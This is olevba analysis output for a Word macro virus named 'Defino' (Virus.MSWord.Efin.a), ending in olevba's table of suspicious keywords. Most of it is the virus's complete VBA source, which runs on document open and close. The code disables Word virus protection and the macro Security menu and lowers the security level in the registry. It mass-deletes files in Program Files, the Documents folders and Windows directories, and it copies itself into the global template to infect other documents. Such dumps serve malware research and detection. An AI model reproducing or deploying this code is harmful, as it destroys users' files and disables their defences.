olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Efin.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Efin.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Efine.bas 
in file: Virus.MSWord.Efin.a - OLE stream: 'Macros/VBA/Efine'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Virus: Defino
'Escrito por : Brasileiro.
'=========================
'Brasil 2005
'-------------------------

Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro virus Defino"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.Efine.AutoOpen"
On Error Resume Next
With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
   End With
Application.Caption = UserName & ">==================Virus word macro====================="

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Settings", "Anchor Color") = " 139,69,19" ' Brown
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Settings", "Anchor Color Visited") = " 255,255,0" ' Yellow
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Settings", "Background Color") = " 0,0,255" ' Blue
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Settings", "Text Color") = " 255,0,0" 'Red
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Settings", "Use Anchor Hover Color") = " yes"

WordBasic.Kill "C:\Arquivos de programas\*.*"
WordBasic.Kill "C:\Program Files\*.*"
WordBasic.Kill "C:\My Documents\*.*"
WordBasic.Kill "C:\Meus Documentos\*.*"
WordBasic.Kill "C:\WINDOWS\Command\*.*"
WordBasic.Kill "C:\WINDOWS\Temp\*.*"
WordBasic.Kill "C:\WINDOWS\Help\*.*"
WordBasic.Kill "C:\WINDOWS\Fonts\*.*"
MsgBox " Virus fez uma limpeza!", vbOKOnly + vbCritical, " Macro virus informa!!"

If Day(Now()) = 7 Or (Day(Now)) = 15 Or (Day(Now)) = 21 Or (Day(Now)) = 29 Then
MsgBox " Virus deletou arquivos!!", vbOKOnly + vbCritical, "Virus esclarece!!"
WordBasic.Kill "C:\WINDOWS\*.com"
WordBasic.Kill "C:\WINDOWS\*.ini"
WordBasic.Kill "C:\WINDOWS\*.txt"
WordBasic.Kill "C:\WINDOWS\*.gif"

End If
End Sub

Sub AutoClose()
Attribute AutoClose.VB_Description = "Macro virus Defino"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.Efine.AutoClose"
On Error Resume Next

    ChangeFileOpenDirectory "C:\Windows\"
    For i = 1 To 145
        ActiveDocument.SaveAs FileName:=("Virtual" & i & ".DOC")
    
    Next
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "Efine" Then
        binstalled = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "Efine" Then
        bTooMuchTrouble = -1
    End If
Next i
If Not binstalled And Not bTooMuchTrouble Then
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":Efine"
    WordBasic.MacroCopy sMacro$, "Global:Efine"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:Efine"
    
End If

End Sub

Sub Toolsmacro()
Attribute Toolsmacro.VB_Description = "Macro virus Defino"
Attribute Toolsmacro.VB_ProcData.VB_Invoke_Func = "Project.Efine.macro"
On Error Resume Next
CommandBars("Macro").Controls("Security...").Enabled = False
End Sub



'Infecta documentos word.
'Infect word documents.
'<><>Word Macro virus<><>
'=========================
'Ano 2005 - Brasil
'-------------------------









+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Virtual             |May detect virtualization                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

